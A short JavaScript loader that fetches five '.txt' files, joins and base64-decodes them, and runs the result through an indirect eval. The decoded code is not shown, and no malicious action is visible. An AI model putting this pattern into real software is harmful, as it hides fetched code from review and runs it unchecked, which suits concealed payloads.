const parts = ["app.part1.txt", "app.part2.txt", "app.part3.txt", "app.part4a.txt", "app.part4b.txt"];
const chunks = await Promise.all(parts.map(async (part) => {
  const response = await fetch(part, { cache: "no-store" });
  if (!response.ok) throw new Error("Unable to load " + part);
  return (await response.text()).trim();
}));
const binary = atob(chunks.join(""));
const bytes = Uint8Array.from(binary, (char) => char.charCodeAt(0));
const code = new TextDecoder().decode(bytes);
(0, eval)(code);
